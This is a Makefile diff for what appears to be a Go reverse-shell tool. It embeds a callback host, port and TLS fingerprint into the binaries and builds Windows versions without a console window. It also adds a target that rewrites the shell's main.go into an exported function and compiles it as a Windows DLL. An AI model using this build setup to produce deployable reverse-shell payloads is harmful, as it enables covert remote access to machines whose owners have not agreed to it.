@@ -13,10 +13,11 @@ FINGERPRINT=$(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cu
 LHOST ?= 127.0.0.1
 LPORT ?= 8443
 STRIP=-s
-LINUX_LDFLAGS=--ldflags "${STRIP} -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
-WIN_LDFLAGS=--ldflags "${STRIP} -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT} -H windowsgui"
+LINUX_LDFLAGS=-ldflags "${STRIP} -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
+WIN_LDFLAGS=-ldflags "${STRIP} -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT} -H windowsgui"
 
-MINGW=x86_64-w64-mingw32-gcc-6.3-win32
+MINGW=x86_64-w64-mingw32-gcc
+CXX=x86_64-w64-mingw32-g++
 
 # zStd is a highly efficient compression library that requires CGO compilation If you'd like to
 # turn this feature on and have experience cross-compiling with cgo, enable the feature below for
@@ -69,6 +70,16 @@ linux_arm:
 	$(eval GOOS=linux)
 	$(eval GOARCH=arm)
 	${BUILD} ${ZSTD} ${LINUX_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${SRC}
+
+windll:
+	@cp cmd/gorsh/main.go ${OUT}/${NAME}.go
+	@sed -i '1 a import "C"' ${OUT}/${NAME}.go
+	@echo '//export Run' >> ${OUT}/${NAME}.go
+	@echo 'func Run() { main() }' >> ${OUT}/${NAME}.go
+
+	CGO_ENABLED=1 CC=${MINGW} CXX=${CXX} GOOS=windows GOARCH=amd64 \
+	${BUILD} ${LINUX_LDFLAGS} ${ZSTD} -buildmode=c-archive -o ${OUT}/${NAME}.a ${OUT}/${NAME}.go
+	${MINGW} -shared -pthread -o ${OUT}/${NAME}.dll ${OUT}/${NAME}.c ${OUT}/${NAME}.a -lwinmm -lntdll -lws2_32
 
 windows64:
 	$(eval GOOS=windows)
